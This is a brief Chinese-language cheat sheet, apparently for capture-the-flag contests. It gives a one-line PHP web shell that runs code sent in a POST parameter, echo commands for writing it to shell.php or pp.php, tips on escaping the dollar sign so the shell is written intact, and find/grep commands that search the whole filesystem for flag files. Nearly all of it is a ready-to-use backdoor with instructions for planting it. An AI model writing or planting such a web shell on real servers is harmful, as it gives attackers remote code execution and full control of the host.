# 一句话木马

```php
<?php eval($_POST['a']);?>
```

通过echo写入

```bash
echo '<?php eval($_POST['a']);?>' > shell.php
```

建议：不要直接写入php文件，因为php文件报错没有日志，不清楚具体原因

1、先写入txt文件

2、访问txt文件，查看是否存在特殊字符编码问题

3、遇到特殊字符一般用 `\` 转译

4、检查无误后写入php文件

```bash
echo '<?php eval($_POST[a]); ?>' > shell.txt
```

输出

```
<?php eval(); ?>
```

此时就需要转移

```bash
echo '<?php eval(\$_POST[a]); ?>' > pp.php
```

# 查找flag

```bash
find / -name "*flag*" > /tmp/res1.txt
grep -r "flag" / > /tmp/res2.txt
grep -r "dasctf{" / > /tmp/res2.txt
```